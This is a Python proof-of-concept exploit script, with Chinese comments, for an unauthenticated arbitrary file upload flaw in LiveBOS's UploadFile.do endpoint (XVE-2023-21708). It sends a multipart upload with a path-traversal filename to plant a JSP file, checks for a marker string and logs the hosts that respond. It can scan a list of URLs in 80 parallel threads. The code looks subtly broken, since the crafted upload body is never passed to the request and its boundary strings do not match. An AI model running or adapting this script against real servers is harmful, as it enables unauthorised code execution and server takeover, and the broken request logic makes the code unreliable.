# -*- coding: utf-8 -*-
# LiveBOS UploadFile.do 任意文件上传漏洞(XVE-2023-21708)
# body="Power by LiveBOS"
# 产品简介:LiveBOS（Live Business Object System）是顶点软件自主研发的以业务对象建模为核心的业务中间件及其集成开发工具，它通过业务模型建立直接完成软件开发的创新模式，支持各类基于WEB的专业应用软件与行业大型应用的开发。LiveBOS系统由三个相对独立的产品构成：运行支持支撑平台LiveBOS Server、开发集成环境LiveBOS Studio以及运维管理工具LiveBOS Manager。
# 漏洞概述:LiveBOS UploadFile.do 接口存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def bunner():
    test = """                                                            
\x1b[38m██╗  ██╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗       ██████╗  ██╗███████╗ ██████╗  █████╗ 
\x1b[36m╚██╗██╔╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗      ╚════██╗███║╚════██║██╔═████╗██╔══██╗
\x1b[34m ╚███╔╝ ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗ █████╔╝╚██║    ██╔╝██║██╔██║╚█████╔╝
\x1b[35m ██╔██╗ ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝██╔═══╝  ██║   ██╔╝ ████╔╝██║██╔══██╗
\x1b[31m██╔╝ ██╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝      ███████╗ ██║   ██║  ╚██████╔╝╚█████╔╝
\x1b[33m╚═╝  ╚═╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝       ╚══════╝ ╚═╝   ╚═╝   ╚═════╝  ╚════╝                                         
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>                                       
                    --author:Kucei  --Vession:LiveBOS UploadFile.do 任意文件上传漏洞(XVE-2023-21708)                                                                                                         
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("LiveBOS_UploadFile.do_任意文件上传漏洞(XVE-2023-21708)")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = "/feed/UploadFile.do;.js.jsp"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Content-Type': 'multipart/form-data; boundary=-WebKitFormBoundaryxegqoxxi',
        'Connection': 'close',
    }
    data = '---WebKitFormBoundaryxegqoxxi\r\nContent-Disposition:form-data; name="file"; filename="/../../../../rce.jsp"\r\nContent-Type: image/jpeg\r\n\n<%@ page import="java.io.File" %>\r\n<%\r\n\rout.println("pppppppppoooooooocccccccccccc");\r\n\rString filePath = application.getRealPath(request.getServletPath());\r\n\rnew File(filePath).delete();\r\n%>\r\n---WebKitFormBoundaryxegqoxxi--'
    try :
        response = requests.post(url=target+url_payload,headers=headers,verify=False,timeout=7)
        if response.status_code == 200 and 'rce.jsp' in response.text:
            url_payload = "/rce.jsp;.js.jsp"
            headers = {
                'User-Agent':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
                'Content-Type': 'multipart/form-data; boundary=-WebKitFormBoundaryxegqoxxi',
                'Connection': 'close',
            }
            response = requests.post(url=target+url_payload,headers=headers,verify=False,timeout=7)
            if response.status_code == 200 and 'pppppppppoooooooocccccccccccc' in response.text:
                print( f"[+] {target} 存在漏洞！\n")
                with open('XVE-2023-21708','a',encoding='utf-8')as f:
                    f.write(target+url_payload+'\n')
                    return True
            else:
                print("[-] 不存在漏洞！！")
                return False
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()